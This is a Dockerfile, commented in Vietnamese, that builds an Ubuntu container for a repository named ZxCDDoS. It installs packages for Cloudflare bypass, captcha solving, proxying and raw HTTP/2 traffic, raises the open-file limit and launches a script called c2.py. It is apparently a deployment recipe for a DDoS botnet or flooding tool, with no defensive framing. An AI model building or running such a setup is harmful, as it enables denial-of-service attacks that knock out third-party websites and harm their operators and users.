# Sử dụng Ubuntu làm cơ sở
FROM ubuntu:20.04

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt-get update -y && apt-get upgrade -y \
    && apt-get install -y sudo git golang perl python3 python2 python3-pip curl wget npm \
    && curl -sL https://deb.nodesource.com/setup_14.x | bash - \
    && apt-get install -y nodejs \
    && git clone https://github.com/hoaan1995/ZxCDDoS/ \
    && cd ZxCDDoS/ \
    && npm install requests https-proxy-agent crypto-random-string events fs net cloudscraper request hcaptcha-solver randomstring cluster cloudflare-bypasser http http2 crypto tls \
    && pip3 install -r ZxCDDoS/requirements.txt \
    && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb \
    && apt-get install -y ./google-chrome-stable_current_amd64.deb \
    && ulimit -n 999999 \
    && chmod 777 * \
    && python3 ZxCDDoS/c2.py

# Xoá các file không cần thiết để giảm kích thước image
RUN apt-get clean && rm -rf /var/lib/apt/lists/*

# Thiết lập thư mục làm việc
WORKDIR /ZxCDDoS

# Lệnh mặc định khi container chạy
CMD ["python3", "c2.py"]
